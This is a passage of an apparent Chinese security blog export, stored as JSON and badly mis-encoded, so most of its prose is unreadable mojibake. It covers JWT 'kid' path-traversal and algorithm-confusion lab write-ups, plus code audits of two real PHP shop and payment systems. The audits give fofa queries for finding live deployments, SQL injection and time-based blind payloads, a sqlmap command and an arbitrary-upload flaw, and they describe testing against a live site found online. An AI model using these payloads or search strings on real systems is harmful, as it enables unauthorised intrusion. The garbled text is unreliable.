å¦‚æœæ”»å‡»è€…å¯ä»¥æ“æ§ kid çš„å€¼ï¼Œå¹¶ä¸”æœåŠ¡å™¨åœ¨è¯»å–å¯†é’¥æ—¶å­˜åœ¨æ–‡ä»¶è·¯å¾„æ‹¼æ¥é—®é¢˜ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡ç›®å½•éå†è®¿é—®åˆ°æ•æ„Ÿæ–‡ä»¶ã€‚ ç›®å½•éå†æ”»å‡»ï¼š å¦‚æœæœåŠ¡å™¨ä½¿ç”¨ä»¥ä¸‹ä»£ç æ¥åŠ è½½å¯†é’¥ï¼ˆæ²¡æœ‰è¿‡æ»¤æˆ–å¤„ç†è·¯å¾„è¾“å…¥ï¼‰ï¼š $kid = $_JWT[header][kid];$key = file_get_contents(/var/keys/ . $kid . .key); å½“æ”»å‡»è€…å°† kid è®¾ç½®ä¸º ../../etc/passwd æ—¶ï¼Œæ‹¼æ¥åçš„è·¯å¾„å˜ä¸º /var/keys/../../etc/passwd.keyï¼Œç»è¿‡ç›®å½•éå†åï¼Œå®é™…è¯»å–åˆ°çš„æ–‡ä»¶è·¯å¾„æ˜¯ /etc/passwdã€‚ è¿™å°±å¯¼è‡´æœåŠ¡å™¨è¯»å–äº†ä¸åº”è®¿é—®çš„ç³»ç»Ÿæ–‡ä»¶ï¼Œå¹¶å°†è¯¥å†…å®¹ä½œä¸ºå¯†é’¥è¿›è¡Œ JWT éªŒè¯ã€‚ ç»“åˆç­¾åç»•è¿‡ï¼š åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šå°†æ–‡ä»¶çš„å†…å®¹ï¼ˆå¦‚ /etc/passwdï¼‰å½“ä½œ HMAC çš„å¯†é’¥æ¥éªŒè¯ç­¾åã€‚æ”»å‡»è€…å¯ä»¥æå‰ç”Ÿæˆä¸€ä¸ªä»¥ /etc/passwd å†…å®¹ä½œä¸ºå¯†é’¥çš„ JWT ç­¾åï¼Œå¹¶é€šè¿‡è¿™ç§æ–¹å¼æ¬ºéª—æœåŠ¡å™¨å®Œæˆç­¾åéªŒè¯ï¼Œä»è€Œç»•è¿‡è®¤è¯ã€‚ æ”»å‡»æµç¨‹ æ”»å‡»è€…ç”Ÿæˆä¸€ä¸ª JWTï¼Œä¼ªé€ å¤´éƒ¨ä¸­çš„ kid å­—æ®µä¸º ../../etc/passwdã€‚ ä½¿ç”¨ /etc/passwd å†…å®¹ä½œä¸º HMAC å¯†é’¥ç”Ÿæˆ JWT ç­¾åã€‚ å°†ä¼ªé€ çš„ JWT å‘é€ç»™æœåŠ¡å™¨ã€‚ æœåŠ¡å™¨æ ¹æ® kid çš„å€¼è¯»å– /etc/passwdï¼Œå¹¶ä½¿ç”¨å…¶å†…å®¹éªŒè¯ç­¾åã€‚ ç­¾åéªŒè¯é€šè¿‡ï¼Œæ”»å‡»è€…æˆåŠŸä¼ªé€  JWTï¼Œè·å¾—æœªæˆæƒçš„è®¿é—® é¢˜ç›®æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹é¶åœºä¸­çš„ä¸€é“é¢˜ è¦æ±‚ï¼šæ­¤å®éªŒå®¤ä½¿ç”¨åŸºäº JWT çš„æœºåˆ¶æ¥å¤„ç†ä¼šè¯ã€‚ä¸ºäº†éªŒè¯ç­¾åï¼ŒæœåŠ¡å™¨ä½¿ç”¨ JWT æ ‡å¤´ä¸­çš„ kid å‚æ•°ä»å…¶æ–‡ä»¶ç³»ç»Ÿä¸­è·å–ç›¸å…³å¯†é’¥ã€‚è¦è§£å†³å®éªŒé—®é¢˜ï¼Œè¯·ä¼ªé€ ä¸€ä¸ª JWTï¼Œè®©æ‚¨èƒ½å¤Ÿè®¿é—® /admin çš„ç®¡ç†é¢æ¿ï¼Œç„¶ååˆ é™¤ç”¨æˆ· carlosã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­è¯ç™»å½•è‡ªå·±çš„å¸æˆ·ï¼šwienerï¼špeter ä»è·å–åˆ°çš„JWTä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥é¢˜ä½¿ç”¨çš„æ˜¯å¯¹ç§°å¯†ç åŠ å¯† æ‰€ä»¥æˆ‘ä»¬æ¥åˆ°æ’ä»¶JWT Editorï¼Œç”Ÿæˆä¸€ä¸ª Symmetric Keyï¼Œä¹Ÿå°±æ˜¯å¯¹ç§°å¯†é’¥ï¼Œå¹¶å°† k çš„å€¼ä¿®æ”¹ä¸ºAA==ï¼ˆbase64ç¼–ç çš„nullå­—èŠ‚ï¼‰ æ¥ç€æˆ‘ä»¬å»ä¿®æ”¹JWTï¼Œå°†kidçš„å€¼ä¿®æ”¹ä¸º../../../../../dev/nullIï¼ˆè¯¥æ–‡ä»¶é»˜è®¤ä¸ºç©ºæ–‡ä»¶ï¼‰ ä¿®æ”¹å®Œåï¼Œç‚¹å‡»Signï¼Œå¯†é’¥è¦é€‰æ‹©åˆšåˆšç”Ÿæˆçš„å¯¹ç§°å¯†é’¥ï¼Œä»¥åŠé€‰æ‹©ç¬¬ä¸€ä¸ªé€‰é¡¹ å°†ç”Ÿæˆçš„JWTå¤åˆ¶ä¸‹æ¥ï¼Œæ‹¿å»æ›´æ”¹æˆ‘ä»¬çš„sessionå€¼ï¼Œåè®¿é—®adminï¼Œåˆ å»ç”¨æˆ·carlosï¼Œè§£å†³é¢˜ç›® JWTç®—æ³•æ··æ·†1ã€å¯¹ç§°åŠ å¯†ä¸éå¯¹ç§°åŠ å¯†å¯ä»¥ä½¿ç”¨ä¸€ç³»åˆ—ä¸åŒçš„ç®—æ³•å¯¹ JWT è¿›è¡Œç­¾åã€‚å…¶ä¸­ä¸€äº›ï¼Œå¦‚HS256ï¼ˆHMAC + SHA-256ï¼‰ä½¿ç”¨â€œå¯¹ç§°â€å¯†é’¥ã€‚è¿™æ„å‘³ç€æœåŠ¡å™¨ä½¿ç”¨å•ä¸ªå¯†é’¥å¯¹ Token è¿›è¡Œç­¾åå’ŒéªŒè¯ã€‚æ˜¾ç„¶ï¼Œè¿™éœ€è¦ä¿å¯†ï¼Œå°±åƒå¯†ç ä¸€æ ·ã€‚ å…¶ä»–ç®—æ³•ï¼Œä¾‹å¦‚ RS256 (RSA + SHA-256) ä½¿ç”¨â€œéå¯¹ç§°â€å¯†é’¥å¯¹ã€‚å®ƒç”±æœåŠ¡å™¨ç”¨æ¥ç­¾ç½²ä»¤ç‰Œçš„ç§é’¥å’Œå¯ç”¨äºéªŒè¯ç­¾åçš„æ•°å­¦ç›¸å…³çš„å…¬é’¥ç»„æˆã€‚ é¡¾åæ€ä¹‰ï¼Œç§é’¥å¿…é¡»ä¿å¯†ï¼Œä½†å…¬é’¥é€šå¸¸æ˜¯å…±äº«çš„ï¼Œä»¥ä¾¿ä»»ä½•äººéƒ½å¯ä»¥éªŒè¯æœåŠ¡å™¨é¢å‘çš„ä»¤ç‰Œçš„ç­¾åã€‚ 2ã€ç®—æ³•æ··æ·†æ¼æ´äº§ç”Ÿçš„åŸå› ç®—æ³•æ··ä¹±æ¼æ´é€šå¸¸æ˜¯ç”±äº JWT åº“çš„å®ç°æœ‰ç¼ºé™·è€Œå¼•èµ·çš„ã€‚å°½ç®¡å®é™…çš„éªŒè¯è¿‡ç¨‹å› æ‰€ä½¿ç”¨çš„ç®—æ³•è€Œå¼‚ï¼Œä½†è®¸å¤šåº“æä¾›äº†ä¸€ç§ä¸ç®—æ³•æ— å…³çš„å•ä¸€æ–¹æ³•æ¥éªŒè¯ç­¾åã€‚è¿™äº›æ–¹æ³•ä¾èµ–äºalgä»¤ç‰Œæ ‡å¤´ä¸­çš„å‚æ•°æ¥ç¡®å®šå®ƒä»¬åº”æ‰§è¡Œçš„éªŒè¯ç±»å‹ã€‚ ä»¥ä¸‹ä¼ªä»£ç æ˜¾ç¤ºäº†æ­¤æ³›å‹verify()æ–¹æ³•çš„å£°æ˜åœ¨ JWT åº“ä¸­çš„ç®€åŒ–ç¤ºä¾‹ï¼š function verify(token, secretOrPublicKey) algorithm = token.getAlgHeader(); if(algorithm == RS256) // Use the provided key as an RSA public key else if (algorithm == HS256) // Use the provided key as an HMAC secret key å½“éšåä½¿ç”¨æ­¤æ–¹æ³•çš„ç½‘ç«™å¼€å‘äººå‘˜å‡è®¾å®ƒå°†ä¸“é—¨å¤„ç†ä½¿ç”¨ RS256 ç­‰éå¯¹ç§°ç®—æ³•ç­¾åçš„ JWT æ—¶ï¼Œå°±ä¼šå‡ºç°é—®é¢˜ã€‚ç”±äºè¿™ä¸ªæœ‰ç¼ºé™·çš„å‡è®¾ï¼Œä»–ä»¬å¯èƒ½æ€»æ˜¯å°†å›ºå®šçš„å…¬é’¥ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š publicKey = public-key-of-server; token = request.getCookie(session); verify(token, publicKey); åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæœåŠ¡å™¨æ”¶åˆ°ä½¿ç”¨ HS256 ç­‰å¯¹ç§°ç®—æ³•ç­¾åçš„ä»¤ç‰Œï¼Œåˆ™åº“çš„é€šç”¨verify()æ–¹æ³•ä¼šå°†å…¬é’¥è§†ä¸º HMAC å¯†é’¥ã€‚è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä½¿ç”¨ HS256 å’Œå…¬é’¥å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åï¼Œå¹¶ä¸”æœåŠ¡å™¨å°†ä½¿ç”¨ç›¸åŒçš„å…¬é’¥æ¥éªŒè¯ç­¾åã€‚ ä¸Šè¾¹æ˜¯æŠ„å®˜æ–¹çš„è¯ï¼Œä¸‹è¾¹æˆ‘ä»¬ç”¨å¤§ç™½è¯æ¥è§£é‡Šä¸€ä¸‹ï¼š å‡è®¾å¼€å‘ä½¿ç”¨çš„æ˜¯RS256è¿™éå¯¹ç§°åŠ å¯†ç®—æ³•ç”Ÿæˆçš„jwtã€‚ ç”±äºä¿¡æ¯æ³„éœ²ç­‰åŸå› æ”»å‡»è€…å¯ä»¥æ‹¿åˆ°è¿™ä¸ªå…¬é’¥ï¼Œå› ä¸ºä¸Šè¾¹è¯´è¿‡å…¬é’¥é€šå¸¸æ˜¯å…±äº«çš„ æ”»å‡»è€…ä½¿ç”¨HS256ç®—æ³•ä¼ªé€ ä¸€ä¸ªjwtï¼Œç”¨è¿™ä¸ªå…¬é’¥ä½œä¸ºç­¾åçš„å¯†é’¥ã€‚ ç¨‹åºä¼šä½¿ç”¨verify()è¿™ä¸ªæ–¹æ³•æ¥éªŒè¯jwtæœ‰æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚ä½†æ˜¯è¿™ä¸ªåº“è®¾è®¡çš„æœ‰é—®é¢˜ï¼ˆé—®é¢˜ï¼šä»–æ˜¯é€šè¿‡ä½ jwtå¤´ä¸­algæ¥åˆ¤æ–­æ˜¯ä½¿ç”¨é‚£ç§ç®—æ³•æ¥è¿›è¡Œç­¾åçš„ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç¯¡æ”¹ä»–çš„ç®—æ³•ï¼‰ï¼Œè¿™å—å°±ä¼šä½¿ç”¨RS256ç”Ÿæˆçš„å…¬é’¥ä½œä¸ºHS256çš„ç§˜é’¥æ¥éªŒè¯æ”»å‡»è€…ä¼ªé€ çš„jwtã€‚è¿™ä¸ªå…¬é’¥æ”»å‡»è€…å¯æ§ï¼Œæ‰€ä»¥ä¼ªé€ çš„jwtå°±ä¼šé€šè¿‡éªŒè¯ã€‚ 3ã€æ‰§è¡Œç®—æ³•æ··æ·†æ”»å‡»çš„æ­¥éª¤ è·å–æœåŠ¡å™¨çš„å…¬é’¥ å°†å…¬é’¥è½¬æ¢ä¸ºåˆé€‚çš„æ ¼å¼ åˆ›å»ºä¸€ä¸ªæ¶æ„ JWTï¼Œå…¶è´Ÿè½½ç»è¿‡ä¿®æ”¹ï¼Œalgæ ‡å¤´è®¾ç½®ä¸ºHS256. ä½¿ç”¨å…¬é’¥ä½œä¸ºç§˜å¯†ï¼Œä½¿ç”¨ HS256 å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åã€‚ 4ã€é€šè¿‡ç®—æ³•æ··æ·†ï¼ˆæ³„éœ²äº†å¯†é’¥ï¼‰ç»•è¿‡ JWT èº«ä»½éªŒè¯æ¥çœ‹çœ‹é¶åœºä¸­çš„é¢˜ç›® è¦æ±‚ï¼šæ­¤å®éªŒå®¤ä½¿ç”¨åŸºäº JWT çš„æœºåˆ¶æ¥å¤„ç†ä¼šè¯ã€‚å®ƒä½¿ç”¨å¼ºå¤§çš„ RSA å¯†é’¥å¯¹å¯¹ä»¤ç‰Œè¿›è¡Œç­¾åå’ŒéªŒè¯ã€‚ä½†æ˜¯ï¼Œç”±äºå®ç°ç¼ºé™·ï¼Œæ­¤æœºåˆ¶å®¹æ˜“å—åˆ°ç®—æ³•æ··æ·†æ”»å‡»ã€‚è¦è§£å†³è¯¥å®éªŒé—®é¢˜ï¼Œè¯·é¦–å…ˆè·å–æœåŠ¡å™¨çš„å…¬é’¥ã€‚è¿™æ˜¯é€šè¿‡æ ‡å‡†ç«¯ç‚¹å…¬å¼€çš„ã€‚ä½¿ç”¨æ­¤å¯†é’¥å¯¹ä¿®æ”¹åçš„ä¼šè¯ä»¤ç‰Œè¿›è¡Œç­¾åï¼Œè¯¥ä»¤ç‰Œå…è®¸æ‚¨è®¿é—® /admin çš„ç®¡ç†é¢æ¿ï¼Œç„¶ååˆ é™¤ç”¨æˆ· carlosã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‡­è¯ç™»å½•è‡ªå·±çš„å¸æˆ·ï¼šwienerï¼špeter æç¤ºï¼šå¯ä»¥å‡è®¾æœåŠ¡å™¨å°†å…¶å…¬é’¥å­˜å‚¨ä¸º X.509 PEM æ–‡ä»¶ æœåŠ¡å™¨æœ‰æ—¶ä¼šé€šè¿‡æ˜ å°„åˆ° /jwks.json æˆ– /.well-known/jwks.json çš„æ ‡å‡†ç«¯ç‚¹å°†å…¶å…¬æœ‰å¯†é’¥ä½œä¸º JSON Web å¯†é’¥ ï¼ˆJWKï¼‰ å¯¹è±¡å…¬å¼€ã€‚è¿™äº›å¯ä»¥å­˜å‚¨åœ¨ç§°ä¸º keys çš„ JWK æ•°ç»„ä¸­ã€‚è¿™ç§°ä¸º JWK é›†ã€‚ keys: [ kty: RSA, e: AQAB, kid: 75d0ef47-af89-47a9-9061-7c02a610d5ab, n: o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ , kty: RSA, e: AQAB, kid: d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA, n: fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw ] æ‰€ä»¥æˆ‘ä»¬å°è¯•è®¿é—®jwks.jsonï¼Œè·å–åˆ°å¦‚ä¸‹å†…å®¹ keys:[kty:RSA,e:AQAB,use:sig,kid:1c5caebf-7b98-464a-a532-f29489724191,alg:RS256,n:9cl7xLTPv-2lil8QK7FPE4yZR0evPLStVq9QgBHQyqQBsKBC1j6n3Av361kRrVyS3aZGycr0OzVdOgNNQalgHOevwgLEOY_t9BhTJdNe5x7hWiV4BKuI_RPupVTZetDHdtSBamY6fg5MHXbDQMF82dUYE_MJncIMWzUuz7UjIcGuf9fInDcaRZ8cvEEW_Q6em-xxIOTTHE1BK7fO_nNDHcggENAsR0CZCXLVzwZA8KvgPDYinhPDIZoN8AKL8kcJUhzJdERfT1TcQM7uajeItu55mHLE4V16lwzOxhXyLgAnBMPPjMUcXD_GCFilhT7fseceS8H__9EX7zEJgTT7lw] â€‹\tå°†å…¶ä¸­çš„jwtéƒ¨åˆ†å¤åˆ¶ä¸‹æ¥ï¼Œè½¬åˆ°bpçš„JWT Editorä¸­æ–°ç”Ÿæˆä¸€ä¸ªRSAå¯†é’¥ï¼Œå°†å¤åˆ¶çš„å†…å®¹ç²˜è´´è¿›å»ï¼Œç‚¹å‡»ç”Ÿæˆåï¼Œå³é”®é€‰ä¸­â€Copy Public Key as PEMâ€ï¼Œæœ€åä¸€è¡Œç©ºè¡Œä¸è¦åˆ æ‰ -----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA9cl7xLTPv+2lil8QK7FPE4yZR0evPLStVq9QgBHQyqQBsKBC1j6n3Av361kRrVyS3aZGycr0OzVdOgNNQalgHOevwgLEOY/t9BhTJdNe5x7hWiV4BKuI/RPupVTZetDHdtSBamY6fg5MHXbDQMF82dUYE/MJncIMWzUuz7UjIcGuf9fInDcaRZ8cvEEW/Q6em+xxIOTTHE1BK7fO/nNDHcggENAsR0CZCXLVzwZA8KvgPDYinhPDIZoN8AKL8kcJUhzJdERfT1TcQM7uajeItu55mHLE4V16lwzOxhXyLgAnBMPPjMUcXD/GCFilhT7fseceS8H//9EX7zEJgTT7lwIDAQAB-----END PUBLIC KEY----- å°†è¯¥éƒ¨åˆ†å†…å®¹æ‹¿å»base64ç¼–ç åæŠŠä¾¿ç¼–ç ç»“æœå¤åˆ¶èµ·æ¥ï¼Œå¦‚ä¸‹ LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUE5Y2w3eExUUHYrMmxpbDhRSzdGUApFNHlaUjBldlBMU3RWcTlRZ0JIUXlxUUJzS0JDMWo2bjNBdjM2MWtSclZ5UzNhWkd5Y3IwT3pWZE9nTk5RYWxnCkhPZXZ3Z0xFT1kvdDlCaFRKZE5lNXg3aFdpVjRCS3VJL1JQdXBWVFpldERIZHRTQmFtWTZmZzVNSFhiRFFNRjgKMmRVWUUvTUpuY0lNV3pVdXo3VWpJY0d1ZjlmSW5EY2FSWjhjdkVFVy9RNmVtK3h4SU9UVEhFMUJLN2ZPL25ORApIY2dnRU5Bc1IwQ1pDWExWendaQThLdmdQRFlpbmhQRElab044QUtMOGtjSlVoekpkRVJmVDFUY1FNN3VhamVJCnR1NTVtSExFNFYxNmx3ek94aFh5TGdBbkJNUFBqTVVjWEQvR0NGaWxoVDdmc2VjZVM4SC8vOUVYN3pFSmdUVDcKbHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg== ç”Ÿæˆä¸€ä¸ªå¯¹ç§°åŠ å¯†çš„keyï¼ŒæŠŠkæ›¿æ¢æˆæˆ‘ä»¬åˆšä¿®æ”¹å®Œæ ¼å¼çš„å…¬é’¥ æ¥ç€å»ä¿®æ”¹æˆ‘ä»¬çš„jwtå€¼ï¼Œä¿®æ”¹algå€¼ï¼Œsubå€¼ï¼Œç­¾åé€‰æ‹©æˆ‘ä»¬åˆšåˆšç”Ÿæˆçš„å¯¹ç§°å¯†é’¥ å°†æ–°ç”Ÿæˆçš„jwtæ‹¿å»æ›¿æ¢ï¼ŒæˆåŠŸè®¿é—®adminï¼Œé¢˜ç›®è§£å†³ 5ã€é€šè¿‡ç®—æ³•æ··æ·†ï¼ˆä¸æš´éœ²å¯†é’¥ï¼‰ç»•è¿‡ JWT èº«ä»½éªŒè¯https://forum.butian.net/share/2734","categories":["CTF"]},{"title":"test","path":"/2024/09/20/test/","content":"bd25ed9264b080267271e137e33d0ce12d665d7bec0b13cb21733fd79087c17c8fea24e9c0b3f47bb8d42505d66c57b3ad3113d7192e5cc73bfe1d7333140361 è¯·è¾“å…¥å¯†ç "},{"title":"ä»£ç å®¡è®¡-æŸå¾®å•†åŸç³»ç»ŸRCEæ¼æ´","path":"/2024/08/24/ä»£ç å®¡è®¡-æŸå¾®å•†åŸç³»ç»ŸRCEæ¼æ´/","content":"å‰è¨€æœ¬æ¬¡å®¡è®¡çš„é¡¹ç›®æœ‰æä¾›éƒ¨ç½²çš„ç›¸å…³æ­¥éª¤å’Œè§†é¢‘æ•™ç¨‹ï¼Œä½†ä¸çŸ¥ä¸ºä½•æˆ‘è‡ªå·±åœ¨æ­å»ºçš„æ—¶å€™ä¼šå‡ºç°è«åçš„é”™è¯¯å¯¼è‡´ç¯å¢ƒæ­å»ºä¸èµ·æ¥ï¼Œå› æ­¤åªèƒ½fofaä¸Šé¢æœä¸€ä¸ªæ¥è¿›è¡Œæµ‹è¯• fofaè¯­å¥ï¼š/Mao_Public/js/jquery-2.1.1.min.js å‰å°sqlæ³¨å…¥æ¼æ´é¦–å…ˆæˆ‘ä»¬å…ˆå®¡è®¡ä¸€ä¸‹ä¸»é¡µä»£ç index.phpï¼Œå‘ç°ä¸€å¤„sqlæŸ¥è¯¢çš„åœ°æ–¹ ?php $rs = $DB-query(SELECT * FROM mao_shop WHERE M_id=$mao[id] and (tj=0 zt=0) order by id desc limit 2); while($rows = $DB-fetch($rs)) if($rows[type] == 1) $type = å¤©çŒ«ä¼˜é€‰; elseif ($rows[type] == 2) $type = è¶…å€¼æ¡æ¼; elseif ($rows[type] == 3) $type = äººæ°”é”€é‡; ? å¯¹$mao[â€˜idâ€™]è¿›è¡Œæº¯æºï¼Œçœ‹çœ‹æ˜¯å¦å¯æ§ $mao=$DB-get_row(select * from mao_data where url=$_SERVER[HTTP_HOST] or url_1=$_SERVER[HTTP_HOST] limit 1); å¯ä»¥çœ‹å‡º$maoçš„å€¼æ˜¯ä»ä¸€ä¸ªå«åšmao_dataçš„è¡¨ä¸­è·å–çš„ï¼Œå› æ­¤æ˜¯ä¸å¯æ§çš„ï¼Œé‚æ”¾å¼ƒ è¯¥æ–‡ä»¶ä¸­è¿˜æœ‰ä¸€ä¸¤å¤„sqlæŸ¥è¯¢çš„åœ°æ–¹ï¼Œä½†å…¶å‚æ•°æˆ‘ä»¬éƒ½ä¸å¯æ§ åœ¨ç½‘é¡µå¤„ä¹±ç‚¹ä¸€é€šåï¼ŒæŸ¥çœ‹bpçš„ä»£ç†æ¨¡å—ä¸­çš„httpå†å²è®°å½•ï¼Œå‘ç°äº†æœ‰è¶£çš„åœ°æ–¹ æŸ¥çœ‹goods.phpæ–‡ä»¶ ?phprequire ./Mao/common.php;$id= isset($_GET[id]) ? $_GET[id] : 0;$cha_1 = $DB-get_row(select * from mao_shop where M_id=$mao[id] and id=$id limit 1);if($cha_1[type] == 1) $bt = å¤©çŒ«ä¼˜é€‰;elseif ($cha_1[type] == 2) $bt = è¶…å€¼æ¡æ¼;elseif ($cha_1[type] == 3) $bt = äººæ°”é”€é‡;if(!$cha_1) sysmsg(å•†å“ä¸å­˜åœ¨ï¼);? å·²çŸ¥$mao[â€˜idâ€™]ä¸å¯æ§ï¼Œä½†æ˜¯åé¢çš„$idå¯ä»¥é€šè¿‡$id= isset($_GET[id]) ? $_GET[id] : 0;è¿›è¡Œæ§åˆ¶ï¼Œè¿˜æ˜¯å•å¼•å·åŒ…æ‹¬ é€šè¿‡æŸ¥çœ‹sqlæ–‡ä»¶å¾—çŸ¥è¡¨mao_shopä¸€å…±æœ‰18å­—æ®µ æ‰€ä»¥æµ‹è¯•ï¼š/goods.php?id=union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--+ å¯ä»¥çœ‹åˆ°å­—æ®µ3ï¼Œ7ï¼Œ12ï¼Œ14å¯æ§ å‰©ä¸‹çš„å°±æ˜¯æ™®é€šçš„unionæ³¨å…¥æ­¥éª¤ï¼Œè¿™è¾¹å°±ä¸è¯¦å†™äº† å‰å°ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´å…¨å±€æœç´¢æ–‡ä»¶ä¸Šä¼ çš„å±é™©å‡½æ•°ï¼Œè¿™æ¬¡æ˜¯move_uploaded_file()ï¼Œä½äºapiapi.phpæ–‡ä»¶ä¸­ elseif($mod == upload) $type = daddslashes($_REQUEST[type]); if($type == 1) if ((($_FILES[file][type] == image/gif) || ($_FILES[file][type] == image/jpeg) || ($_FILES[file][type] == image/png) || ($_FILES[file][type] == image/pjpeg)) ($_FILES[file][size] 5242880)) if ($_FILES[file][error] 0) $result=array(code=-2,msg=ä¸Šä¼ å‡ºé”™ï¼); exit(json_encode($result)); else $cmm = date(YmdHis).rand(111,999); $name = explode(.,$_FILES[file][name]); $newPath = $cmm...$name[1]; if (preg_match(/[\\x7f-\\xff]/, $newPath)) $result=array(code=-3,msg=æ–‡ä»¶åç§°ä¸èƒ½ä¸ºä¸­æ–‡ï¼); exit(json_encode($result)); if (file_exists(../upload/ . $newPath)) $result=array(code=-2,msg=ä¸Šä¼ å‡ºé”™ï¼); exit(json_encode($result)); else move_uploaded_file($_FILES[file][tmp_name],../upload/ . $newPath); $lj=array(src=/upload/$newPath,title=å›¾ç‰‡); $result=array(code=0,msg=ä¸Šä¼ æˆåŠŸï¼,data=$lj,name=/upload/$newPath); exit(json_encode($result)); else $result=array(code=-3,msg=å›¾ç‰‡å¤§å°ä¸èƒ½è¶…è¿‡5Mï¼$_FILES[file][size]); exit(json_encode($result)); else $result=array(code=-1,msg=ä¸Šä¼ ç±»å‹ä¸å­˜åœ¨ï¼); exit(json_encode($result)); å…¶ä¸­$modç”±$mod = isset($_REQUEST[mod]) ? $_REQUEST[mod] :0;æ§åˆ¶ ä¸Šè¿°ä»£ç å¯¹æ–‡ä»¶ä¸Šä¼ çš„éªŒè¯æ˜¯æ£€æµ‹å…¶ä¸Šä¼ çš„mimeç±»å‹æ˜¯å¦æ˜¯å›¾ç‰‡çš„ï¼Œä¸æ£€æŸ¥æ–‡ä»¶ååç¼€ å› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥ä¾¿å¯ä»¥ä¼ªé€ mimeç±»å‹ä¸Šä¼ ä»»æ„æ–‡ä»¶äº† ä¼ªé€ è¯·æ±‚ä½“å¦‚ä¸‹ï¼š è®¿é—®è¯¥æ–‡ä»¶","categories":["ä»£ç å®¡è®¡"]},{"title":"ä»£ç å®¡è®¡-æŸTP6å¯¹æ¥Uæ”¯ä»˜ç³»ç»Ÿ","path":"/2024/08/17/ä»£ç å®¡è®¡-æŸTP6å¯¹æ¥Uæ”¯ä»˜ç³»ç»Ÿ/","content":"å‰è¨€æœ¬æ¬¡å®¡è®¡çš„æ˜¯ä¸€ä¸ªåŸºäºtinkphp6æ¡†æ¶çš„Uæ”¯ä»˜ç³»ç»Ÿ åœ¨fofaä¸Šé¢æœç´¢ï¼š/usdtmerchant/login/reg.htmlä¾¿å¯ä»¥æ‰¾åˆ°ç›¸å…³çš„ç½‘ç«™ï¼Œè¦æ³¨æ„çš„æ˜¯æœ‰äº›ç½‘ç«™å·²ç»è¿›è¡Œäº†æ”¹è¿›ï¼Œå†ä¹Ÿä¸èƒ½åˆ©ç”¨è¯¥æ–‡ç« ä¸­çš„æ¼æ´äº† å‰å°sqlæ³¨å…¥æ¼æ´èº«ä¸ºä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè®¿é—®çš„ä¹Ÿå°±åªæœ‰index.phpï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä»appindexcontrollerIndex.phpå¼€å§‹è¿›è¡Œå®¡è®¡ æˆ‘æ˜¯åœ¨å·²ç»çŸ¥é“æœ‰è¯¥æ¼æ´çš„æƒ…å†µä¸‹è¿›è¡Œå¤ç°çš„ï¼Œæ‰€ä»¥åœ¨è¯¥æ–‡ä»¶ä¸­æˆ‘ç›´æ¥æœç´¢å…³é”®å­—Dbï¼ŒæŸ¥æŸ¥æ˜¯å¦æœ‰å¯ä»¥åˆ©ç”¨çš„å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š public function send() $dd = Db::query(urldecode($_REQUEST[query])); è¯¥æ–¹æ³•å…è®¸ç›´æ¥å¯¹å˜é‡queryè¿›è¡Œèµ‹å€¼ï¼Œè¾“å…¥ç›¸å…³çš„æœç´¢è¯­å¥ï¼Œç›´æ¥è¿è¡Œ è¯¥æ–¹æ³•å¹¶æ²¡æœ‰å¯¹è¾“å…¥çš„å†…å®¹è¿›è¡ŒéªŒè¯ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥æ¼æ´ æ­£æ˜¯å› ä¸ºè¯­å¥æ˜¯æˆ‘ä»¬è‡ªå·±è¾“å…¥çš„ï¼Œæ‰€ä»¥å¹¶ä¸å­˜åœ¨è”åˆæ³¨å…¥æ¼æ´ï¼Œæ— æ³•æŠ¥é”™æ³¨å…¥ å°è¯•åå¯çŸ¥è¯¥æ–¹æ³•åªè¦æœç´¢è¯­å¥æ­£ç¡®çŠ¶æ€ç ä¾¿æ˜¯200ï¼Œé”™è¯¯çš„è¯å°±æ˜¯400ï¼Œæ‰€ä»¥æ— æ³•åˆ©ç”¨å¸ƒå°”ç›²æ³¨ï¼Œå› æ­¤å°±å‰©ä¸€ä¸ªæ—¶é—´ç›²æ³¨ è¾“å…¥ï¼š/index/index/send?query=select+if(length(database())=3,sleep(3),1) ç”±å›¾å¯çŸ¥æ•°æ®åº“åå­—é•¿åº¦ä¸º3ï¼Œå­˜åœ¨æ—¶é—´ç›²æ³¨ å‰©ä¸‹æ¥çš„æ­¥éª¤å¯ä»¥åˆ©ç”¨è„šæœ¬æ¥è¿›è¡Œï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨sqlmapæ¥è¿›è¡Œ sqlmapçš„è¯­å¥å¦‚ä¸‹ï¼š python sqlmap.py -u http://127.0.0.1:81/index/index/send?query=* --level=3 --dbms=mysql 